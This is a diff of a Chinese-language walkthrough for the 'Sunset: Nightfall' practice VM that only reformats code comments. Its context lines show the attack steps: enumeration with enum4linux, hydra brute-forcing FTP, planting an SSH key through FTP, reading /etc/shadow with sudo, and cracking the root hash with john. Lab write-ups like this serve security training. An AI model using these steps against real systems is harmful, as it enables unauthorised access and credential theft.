@@ -35,7 +35,7 @@ enum4linux -a 192.168.56.104
 > **得到两个用户 ‘nightfall’ 和 ‘matt’ ，接下来我们进行暴力破解**
 
 ```
-# SSH破解很长时间无效果，FTP破解很快就出来了
+#SSH破解很长时间无效果，FTP破解很快就出来了
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -e nsr 192.168.56.104 ftp -f
 ```
 
@@ -50,7 +50,7 @@ password:cheese
 ![](./img/Sunset：Nightfall-06.png)
 
 ```
-# 我们通过FTP将SSH密钥上传
+#我们通过FTP将SSH密钥上传
 ssh-keygen
 cp .ssh/id_rsa.pub authorized_keys
 chmod 777 authorized_keys
@@ -115,7 +115,7 @@ sudo cat /etc/shadow
 ![](./img/Sunset：Nightfall-15.png)
 
 ```
-vim root		# 将哈希写入root
+vim root		#将哈希写入root
 john root
 ```
 
